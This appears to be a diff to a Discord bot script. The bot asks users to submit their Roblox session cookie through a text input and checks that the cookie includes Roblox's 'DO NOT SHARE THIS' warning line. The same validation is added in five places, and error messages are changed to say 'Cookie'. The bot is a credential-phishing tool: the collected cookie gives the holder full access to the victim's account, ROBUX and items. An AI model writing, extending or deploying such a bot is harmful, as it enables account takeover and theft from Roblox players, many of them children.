@@ -108,9 +108,18 @@ Thanks!
 }
 ]
 
+
+$onlyif[$replaceText[$textinputvalue[cookie];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]!=;{
+    "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}]
+
 $onlyif[$stringStartsWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
 {
-    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
+    "embeds" : "{newEmbed:{description:Your Cookie Must Include The Warning Line!}{color:ff0000}}",
     "ephemeral" : true,
     "options" : {
         "interaction" : true
@@ -187,9 +196,18 @@ Thanks!
 }
 ]
 
+
+$onlyif[$replaceText[$textinputvalue[cookie];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]!=;{
+    "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}]
+
 $onlyif[$stringStartsWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
 {
-    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
+    "embeds" : "{newEmbed:{description:Your Cookie Must Include The Warning Line!}{color:ff0000}}",
     "ephemeral" : true,
     "options" : {
         "interaction" : true
@@ -266,9 +284,18 @@ Thanks!
 }
 ]
 
+
+$onlyif[$replaceText[$textinputvalue[cookie];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]!=;{
+    "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}]
+
 $onlyif[$stringStartsWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
 {
-    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
+    "embeds" : "{newEmbed:{description:Your Cookie Must Include The Warning Line!}{color:ff0000}}",
     "ephemeral" : true,
     "options" : {
         "interaction" : true
@@ -345,9 +372,17 @@ Thanks!
 }
 ]
 
+$onlyif[$replaceText[$textinputvalue[cookie];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]!=;{
+    "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}]
+
 $onlyif[$stringStartsWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
 {
-    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
+    "embeds" : "{newEmbed:{description:Your Cookie Must Include The Warning Line!}{color:ff0000}}",
     "ephemeral" : true,
     "options" : {
         "interaction" : true
@@ -424,9 +459,18 @@ Thanks!
 }
 ]
 
+
+$onlyif[$replaceText[$textinputvalue[cookie];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_;]!=;{
+    "embeds" : "{newEmbed:{description:Provide Your Cookie Correctly!}{color:ff0000}}",
+    "ephemeral" : true,
+    "options" : {
+        "interaction" : true
+    }
+}]
+
 $onlyif[$stringStartsWith[$textinputvalue[cookieinput];_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_]==true;
 {
-    "embeds" : "{newEmbed:{description:Your Token Must Include The Warning Line!}{color:ff0000}}",
+    "embeds" : "{newEmbed:{description:Your Cookie Must Include The Warning Line!}{color:ff0000}}",
     "ephemeral" : true,
     "options" : {
         "interaction" : true
